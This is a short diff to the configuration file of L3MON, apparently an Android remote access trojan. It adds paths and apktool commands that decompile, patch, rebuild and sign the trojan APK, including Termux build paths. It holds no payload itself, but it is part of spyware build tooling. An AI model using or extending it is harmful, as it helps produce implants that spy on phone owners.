@@ -8,11 +8,12 @@ exports.control_port = 22222;
 // Paths
 
 exports.termux = '/data/data/com.termux/files/home'
+exports.apkBasePath = path.join(__dirname, '../assets/webpublic/base.apk')
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
 exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
 
-exports.termuxApkBuildPath = exports.termux + '/haxrat/build.apk'
-exports.termuxApkSignedBuildPath = exports.termux + '/haxrat/haxRat.apk'
+exports.termuxApkBuildPath = exports.termux + '/assets/webpublic/build.apk'
+exports.termuxApkSignedBuildPath = exports.termux + '/assets/webpublic/L3MON.apk'
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
 
@@ -23,6 +24,7 @@ exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IO
 
 exports.termuxBuildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -o "' + exports.termuxApkBuildPath + '"';
 exports.termuxSignCommand = 'apkmod -s "' + exports.termuxApkBuildPath + '"' + ' -o ' + '"' + exports.termuxApkSignedBuildPath + '"' ;
+exports.decompiledCommand = 'java -jar "' + exports.apkTool + '" d "' + exports.apkBasePath + '" -f -s -o "' + exports.smaliPath + '"';
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
 exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
 
